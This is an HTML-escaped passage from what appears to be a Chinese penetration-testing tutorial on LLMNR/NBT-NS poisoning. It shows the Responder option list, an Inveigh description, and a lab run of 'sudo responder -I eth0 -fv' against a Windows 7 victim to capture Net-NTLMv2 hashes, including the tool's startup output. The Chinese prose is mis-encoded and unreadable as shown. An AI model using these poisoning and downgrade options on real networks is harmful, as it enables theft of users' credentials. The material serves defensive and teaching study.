&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf auxiliary(llmnr_response) &amp;gt; run
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;responder&#34;&gt;Responder&lt;/h2&gt;
&lt;p&gt;Responderæ˜¯ä¸€æ¬¾å¾ˆå¼ºå¤§çš„ä¸­é—´äººåˆ©ç”¨å·¥å…·ï¼Œä¹Ÿæ˜¯æœ¬æ–‡ä¸­å®è·µä½¿ç”¨çš„å·¥å…·ï¼Œä¸»è¦çš„åŠŸèƒ½æœ‰åŒ IPv6/IPv4 å †æ ˆã€å†…ç½® SMB èº«ä»½éªŒè¯æœåŠ¡å™¨ã€å†…ç½® MSSQL èº«ä»½éªŒè¯æœåŠ¡å™¨ã€å†…ç½® HTTP èº«ä»½éªŒè¯æœåŠ¡å™¨ã€å†…ç½® HTTPS èº«ä»½éªŒè¯æœåŠ¡å™¨ã€å†…ç½® LDAP èº«ä»½éªŒè¯æœåŠ¡å™¨ã€å†…ç½® DCE-RPC èº«ä»½éªŒè¯æœåŠ¡å™¨ã€å†…ç½® FTPã€POP3ã€IMAPã€SMTP Auth æœåŠ¡å™¨ã€å†…ç½®DNSæœåŠ¡å™¨ã€å†…ç½® WPAD ä»£ç†æœåŠ¡å™¨ã€æµè§ˆå™¨ç›‘å¬å™¨ã€æŒ‡çº¹è¯†åˆ«ã€Icmp é‡å®šå‘ã€DHCPæ¬ºéª—ã€åˆ†ææ¨¡å¼ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹è½½åœ°å€ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/lgandx/Responder&#34;&gt;https://github.com/lgandx/Responder&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨æ–¹æ³•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--version             show program&amp;#39;s version number and exit
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-h, --help            show this help message and exit
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-A, --analyze         Analyze mode. This option allows you to see NBT-NS,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    BROWSER, LLMNR requests without responding.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-I eth0, --interface=eth0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    Network interface to use, you can use &amp;#39;ALL&amp;#39; as a
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    wildcard for all interfaces
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-i 10.0.0.21, --ip=10.0.0.21
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    Local IP to use (only for OSX)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    Poison all requests with another IPv6 address than
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    Responder&amp;#39;s one.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-e 10.0.0.22, --externalip=10.0.0.22
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    Poison all requests with another IP address than
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    Responder&amp;#39;s one.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-b, --basic           Return a Basic HTTP authentication. Default: NTLM
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-d, --DHCP            Enable answers for DHCP broadcast requests. This
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    option will inject a WPAD server in the DHCP response.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    Default: False
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-D, --DHCP-DNS        This option will inject a DNS server in the DHCP
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    response, otherwise a WPAD server will be added.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    Default: False
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-w, --wpad            Start the WPAD rogue proxy server. Default value is
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    False
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    Upstream HTTP proxy used by the rogue WPAD Proxy for
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    outgoing requests (format: host:port)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    retrieval. This may cause a login prompt. Default:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    False
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    authentication for the proxy. WPAD doesn&amp;#39;t need to be
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    ON. This option is highly effective when combined with
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    -r. Default: False
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--lm                  Force LM hashing downgrade for Windows XP/2003 and
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    earlier. Default: False
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--disable-ess         Force ESS downgrade. Default: False
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-v, --verbose         Increase verbosity.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;inveigh&#34;&gt;Inveigh&lt;/h2&gt;
&lt;p&gt;IInveigh é€šè¿‡æ•°æ®åŒ…å—…æ¢å’Œåè®®ç‰¹å®šçš„ isteners/sockets è¿›è¡Œæ¬ºéª—æ”»å‡»å’Œå“ˆå¸Œ/å‡­è¯æ•è·ã€‚ä½œä¸ºè¯¥å·¥å…·åŸå§‹ Powershell ç‰ˆæœ¬çš„åŸºç¡€çš„æ•°æ®åŒ…å—…æ¢æ–¹æ³•å…·æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;é€šè¿‡ Window çš„ SMB æœåŠ¡æ•è· SMB NTLM è´¨è¯¢/å“åº”&lt;/li&gt;
&lt;li&gt;ä¸»æœºç³»ç»Ÿä¸Šæ›´å°‘çš„å¯è§ç«¯å£ç»‘å®š&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä¸»è¦ç¼ºç‚¹æ˜¯éœ€è¦æå‡è®¿é—®æƒé™ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨å½“å‰ç‰ˆæœ¬çš„ Windows ä¸Šï¼Œé»˜è®¤è¿è¡Œçš„ UDP æœåŠ¡å…è®¸ç«¯å£é‡ç”¨ã€‚å› æ­¤ï¼Œæ•°æ®åŒ…å—…æ¢ä¸å†ä¸ºç»•è¿‡æ­£åœ¨ä½¿ç”¨çš„ UDP ç«¯å£æä¾›ä¼˜åŠ¿ã€‚Inveigh çš„ UDP ä¾¦å¬å™¨éƒ½é…ç½®ä¸ºåˆ©ç”¨ç«¯å£é‡ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹è½½åœ°å€ï¼šhttps://github.com/Kevin-Robertson/Inveigh.git&lt;/p&gt;
&lt;h1 id=&#34;0x03-æ”»å‡»å®æˆ˜&#34;&gt;0x03 æ”»å‡»å®æˆ˜&lt;/h1&gt;
&lt;h2 id=&#34;æ•è·net-ntlmv2&#34;&gt;æ•è·Net-NTLMv2&lt;/h2&gt;
&lt;h3 id=&#34;ä¸»è¦çš„å·¥ä½œæµç¨‹&#34;&gt;ä¸»è¦çš„å·¥ä½œæµç¨‹&lt;/h3&gt;
&lt;p&gt;å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå—å®³è€…åœ¨ç½‘ç»œä¸­å¯»æ‰¾filesrvrè¿™ä¸ªä¸»æœº(å› ä¸ºå°‘æ‰“äº†ä¸€ä¸ªe)ï¼Œå…ˆå»è¯¢é—®DNSæœåŠ¡å™¨ï¼Œå¦‚æœä¸çŸ¥é“å°±ä¼šå»å†…ç½‘ä¸­å¹¿æ’­è°æ˜¯filesrvrï¼Œæ”»å‡»è€…å°±ä¼šè®¾ç½®ä¸€ä¸ªç›‘å¬ï¼Œå‡è£…å›åº”è¯´ä»–å°±æ˜¯filesrvrï¼Œä¸­é—´å°±ä¼šå‘å‡ºè·å–hashä¿¡å·ï¼Œå½“æ”»å‡»è€…æ”¶åˆ°åæœºä¼šè¿”å›é”™è¯¯çš„ä¿¡æ¯ç»™å—å®³è€…ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;å®æˆ˜&#34;&gt;å®æˆ˜&lt;/h3&gt;
&lt;p&gt;å®æˆ˜æˆ‘ä»¬æ˜¯ä½¿ç”¨ä¸€å°å—å®³è€…Windows 7(172.16.0.105)ï¼Œä¸€å°æ”»å‡»è€…Kali Linux (172.16.0.107)ï¼ŒResponderå·¥å…·æ˜¯kaliè‡ªå¸¦çš„ï¼Œæ‰€ä»¥ç›´æ¥åœ¨kaliæ‰§è¡Œresponderå³å¯ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨Kaliä¸Šé¢æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œè®°å¾—æ˜¯ä»¥sudoæ–¹å¼æ‰§è¡Œ,fæ˜¯æŒ‡è·å–æŒ‡çº¹ï¼Œvæ˜¯è¯¦æƒ…ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;/usr/share/responder&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ sudo responder -I eth0 -fv                                                                                                                                                                                                                                                              
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                         __
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  .----.-----.-----.-----.-----.-----.--&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;.-----.----.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   _&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  -__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__ --&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  _  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  _  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  _  &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;  -__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   _&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_____&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_____&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   __&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_____&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_____&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;_____&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           NBT-NS, LLMNR &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; MDNS Responder 3.0.7.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Author: Laurent Gaffie &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;laurent.gaffie@gmail.com&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  To &lt;span class=&#34;nb&#34;&gt;kill&lt;/span&gt; this script hit CTRL-C
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Poisoners:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    LLMNR                      &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    NBT-NS                     &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    DNS/MDNS                   &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    DHCP                       &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Servers:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    HTTP server                &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    HTTPS server               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    WPAD proxy                 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Auth proxy                 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    SMB server                 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Kerberos server            &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    SQL server                 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    FTP server                 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    IMAP server                &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    POP3 server                &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    SMTP server                &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    DNS server                 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    LDAP server                &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    RDP server                 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    DCE-RPC server             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    WinRM server               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; HTTP Options:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Always serving EXE         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Serving EXE                &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Serving HTML               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Upstream Proxy             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Poisoning Options:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Analyze Mode               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Force WPAD auth            &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Force Basic Auth           &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Force LM downgrade         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Force ESS downgrade        &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Fingerprint hosts          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Generic Options:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Responder NIC              &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;eth0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Responder IP               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;172.16.0.107&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Challenge &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;              &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;random&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Don&lt;span class=&#34;s1&#34;&gt;&amp;#39;t Respond To Names     [&amp;#39;&lt;/span&gt;ISATAP&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Current Session Variables:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Responder Machine Name     &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;WIN-OVB356BIVFL&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Responder Domain Name      &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OATW.LOCAL&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Responder DCE-RPC Port     &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;45303&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
